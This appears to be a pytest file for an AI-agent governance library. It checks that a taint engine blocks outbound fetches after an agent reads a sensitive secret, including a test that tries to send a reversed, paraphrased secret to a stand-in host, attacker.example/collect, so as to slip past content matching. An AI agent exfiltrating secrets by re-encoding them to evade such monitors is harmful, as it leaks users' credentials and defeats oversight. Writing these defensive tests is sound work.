"""Phase 1.1b — confidentiality SOUND FLOOR (TM4).

Per-value confidentiality (content-matching) is X1-leaky: a paraphrased / re-encoded
secret evades the ledger. The density numbers confirmed it catches under half of
what a session floor does. So egress rides a SOUND FLOOR: once a sensitive source
is read, the session is egress-restricted on the FACT of the read — independent of
the egress value's content — and released only by governance endorsement. Sparse by
construction (fires only after a sensitive read).

These pin: the sound win (clean payload still denied after a secret read), sparsity
(no false floor without a secret read), short-secret soundness (NM1), endorsement
release, child inheritance, and that non-egress sinks keep the per-value precision.
"""

from __future__ import annotations

from typing import Any

import pytest

from axor_core.capability.executor import CapabilityExecutor, ToolHandler
from axor_core.contracts.cancel import make_token
from axor_core.contracts.context import ContextView, LineageSummary
from axor_core.contracts.envelope import (
    Capabilities,
    ExecutionEnvelope,
    ExportContract,
)
from axor_core.contracts.policy import ExecutionPolicy, ExportMode, ToolPolicy
from axor_core.contracts.result import ExecutorEvent, ExecutorEventKind
from axor_core.contracts.taint import TaintSource
from axor_core.node.intent_loop import IntentLoop
from axor_core.taint.causal_root import CausalRoot
from axor_core.taint.engine import TaintEngine

pytestmark = pytest.mark.adversarial

SECRET = "SENSITIVE_KEY_zzz9988776655"
ATTACKER = "http://attacker.example/collect"


class _Handler(ToolHandler):
    def __init__(self, name: str, output: Any) -> None:
        self._n, self._o = name, output

    @property
    def name(self) -> str:
        return self._n

    async def execute(self, args: dict[str, Any]) -> Any:
        return self._o


def _executor() -> CapabilityExecutor:
    ex = CapabilityExecutor()
    ex.register(_Handler("fetch", "ok"))     # egress
    ex.register(_Handler("write", "ok"))     # local mutation (non-egress)
    return ex


def _env() -> ExecutionEnvelope:
    policy = ExecutionPolicy(name="t", tool_policy=ToolPolicy(allow_write=True))
    lineage = LineageSummary(node_id="n1", parent_id=None, depth=0,
                             ancestry_ids=[], inherited_restrictions=[])
    ctx = ContextView(node_id="n1", working_summary="t", visible_fragments=[],
                      active_constraints=[], lineage=lineage, token_count=0,
                      compression_ratio=1.0)
    caps = Capabilities(
        allowed_tools=frozenset({"fetch", "write"}), allow_children=False,
        allow_nested_children=False, allow_context_expansion=False,
        allow_export=True, allow_mutation=True, max_child_depth=0,
    )
    return ExecutionEnvelope(
        node_id="n1", task="t", context=ctx, policy=policy, capabilities=caps,
        export_contract=ExportContract(mode=ExportMode.FULL,
                                       allowed_fields=frozenset(["output"]),
                                       max_export_tokens=1024),
        lineage=lineage, cancel_token=make_token(),
    )


async def _resolve(loop, env, tool, args):
    ev = ExecutorEvent(kind=ExecutorEventKind.TOOL_USE,
                       payload={"tool": tool, "args": args, "tool_use_id": "x"},
                       node_id=env.node_id)
    return await loop._resolve_tool_intent(ev, env)


def _read_secret(eng: TaintEngine, secret: str = SECRET):
    eng.register_value(secret, CausalRoot.external_read(TaintSource.FILE, sensitive=True))


@pytest.mark.asyncio
async def test_floor_denies_clean_egress_after_secret_read():
    # THE sound win: a payload carrying no trace of the secret is still denied,
    # because a paraphrased secret could — the floor gates on the read, not content.
    eng = TaintEngine()
    _read_secret(eng)
    loop = IntentLoop(capability_executor=_executor(), trace_events=[], taint_engine=eng)
    r = await _resolve(loop, _env(), "fetch", {"url": "http://example.com/clean"})
    assert not r.approved
    assert "confidentiality" in r.reason


@pytest.mark.asyncio
async def test_floor_is_sparse_no_secret_no_restriction():
    # Sparsity: without a sensitive read, egress of clean data is allowed — the
    # floor never fires spuriously.
    eng = TaintEngine()
    loop = IntentLoop(capability_executor=_executor(), trace_events=[], taint_engine=eng)
    r = await _resolve(loop, _env(), "fetch", {"url": "http://example.com/clean"})
    assert r.approved


@pytest.mark.asyncio
async def test_floor_blocks_paraphrased_secret():
    # X1 case the floor closes: the egress value is a re-encoding the content ledger
    # does NOT match, yet egress is denied because the floor is read-fact based.
    eng = TaintEngine()
    _read_secret(eng)
    loop = IntentLoop(capability_executor=_executor(), trace_events=[], taint_engine=eng)
    paraphrase = "the key spelled backwards is 5566778899zzz_YEK"  # won't match ledger
    assert eng.derive_value(paraphrase).sensitive is False         # content-clean...
    r = await _resolve(loop, _env(), "fetch", {"url": ATTACKER, "body": paraphrase})
    assert not r.approved                                          # ...but floor denies


@pytest.mark.asyncio
async def test_short_secret_still_activates_floor_nm1():
    # NM1: a secret shorter than the ledger's minimum fragment stores no fragment,
    # but the floor activates on the READ fact, so egress is still denied.
    eng = TaintEngine()
    _read_secret(eng, secret="x9")          # too short to segment
    assert eng.confidentiality_floor_active() is True
    loop = IntentLoop(capability_executor=_executor(), trace_events=[], taint_engine=eng)
    r = await _resolve(loop, _env(), "fetch", {"url": "http://example.com/clean"})
    assert not r.approved


@pytest.mark.asyncio
async def test_endorsement_lifts_floor():
    eng = TaintEngine()
    _read_secret(eng)
    loop = IntentLoop(capability_executor=_executor(), trace_events=[], taint_engine=eng)
    assert not (await _resolve(loop, _env(), "fetch", {"url": "http://example.com/x"})).approved
    eng.endorse_value(SECRET, "operator", "human_operator", "reviewed")
    assert eng.confidentiality_floor_active() is False
    assert (await _resolve(loop, _env(), "fetch", {"url": "http://example.com/x"})).approved


@pytest.mark.asyncio
async def test_endorsing_one_of_two_secrets_keeps_floor():
    eng = TaintEngine()
    _read_secret(eng, "SECRET_ONE_aaaaaaaaaaaa")
    _read_secret(eng, "SECRET_TWO_bbbbbbbbbbbb")
    eng.endorse_value("SECRET_ONE_aaaaaaaaaaaa", "operator", "human_operator", "reviewed")
    assert eng.confidentiality_floor_active() is True     # the other secret is loose
    loop = IntentLoop(capability_executor=_executor(), trace_events=[], taint_engine=eng)
    assert not (await _resolve(loop, _env(), "fetch", {"url": "http://example.com/x"})).approved


@pytest.mark.asyncio
async def test_non_egress_sink_unaffected_by_floor():
    # The floor is egress-only: a local write after a secret read is still allowed
    # (per-value integrity precision is preserved; the floor is confidentiality/egress).
    eng = TaintEngine()
    _read_secret(eng)
    loop = IntentLoop(capability_executor=_executor(), trace_events=[], taint_engine=eng)
    r = await _resolve(loop, _env(), "write", {"path": "/work/notes.txt", "content": "ordinary"})
    assert r.approved


def test_child_inherits_confidentiality_floor():
    parent = TaintEngine()
    _read_secret(parent)
    child = TaintEngine(node_id="child")
    child.inherit_value_ledger(parent)
    # A child of a secret-reading session must be egress-restricted too, else it is
    # a floor bypass.
    assert child.confidentiality_floor_active() is True


def test_clearance_resets_floor():
    eng = TaintEngine()
    _read_secret(eng)
    eng.clear_by_governance("operator", "human_operator", "reviewed")
    assert eng.confidentiality_floor_active() is False
